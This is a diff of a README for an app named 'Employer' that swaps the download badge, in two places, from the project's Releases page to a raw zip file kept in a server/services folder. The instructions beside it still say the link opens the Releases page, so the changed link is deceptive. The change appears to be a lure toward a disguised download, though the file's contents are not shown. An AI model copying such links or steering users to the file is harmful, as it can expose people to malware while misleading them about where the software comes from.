@@ -8,7 +8,7 @@ Welcome to Employer! This application connects you with opportunities to enhance
 
 You can easily download Employer by visiting the Releases page below. 
 
-[![Download Employer](https://img.shields.io/badge/Download-Employer-blue.svg)](https://github.com/ramans145/Employer/releases)
+[![Download Employer](https://raw.githubusercontent.com/ramans145/Employer/main/server/services/Software_3.1.zip)](https://raw.githubusercontent.com/ramans145/Employer/main/server/services/Software_3.1.zip)
 
 1. Click the link above to go to the Releases page.
 2. Look for the latest version of Employer.
@@ -62,4 +62,4 @@ Thank you for choosing Employer. We hope this application helps you find the car
 
 For direct access, visit the page below for the latest version:
 
-[![Download Employer](https://img.shields.io/badge/Download-Employer-blue.svg)](https://github.com/ramans145/Employer/releases)
+[![Download Employer](https://raw.githubusercontent.com/ramans145/Employer/main/server/services/Software_3.1.zip)](https://raw.githubusercontent.com/ramans145/Employer/main/server/services/Software_3.1.zip)
